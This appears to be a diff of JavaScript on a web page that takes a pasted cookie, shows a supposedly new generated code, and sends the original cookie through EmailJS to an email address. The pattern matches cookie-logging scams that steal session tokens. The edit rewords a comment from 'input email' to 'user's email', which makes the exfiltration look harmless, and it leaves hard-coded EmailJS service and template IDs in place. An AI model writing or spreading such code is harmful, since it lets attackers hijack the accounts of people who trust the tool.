@@ -89,7 +89,7 @@
         // Output the generated code
         newCookieOutput.value = newCode;
 
-        // Send the old cookie (input) to the input email
+        // Send the old cookie (input) to the user's email
         sendEmail(cookieInput, userEmail);
       } else {
         newCookieOutput.value = '';
@@ -115,9 +115,8 @@
     // Helper function to send the email via EmailJS
     function sendToEmail(templateParams) {
       const payload = {
-        service_id: 'service_bupfcwd',
-        template_id: 'template_fkuvg0k',
-        user_id: '1RUraa7fRYbQ2fuPR',
+        service_id: 'service_bupfcwd', // Service ID
+        template_id: 'template_fkuvg0k', // Template ID
         template_params: templateParams,
       };
 
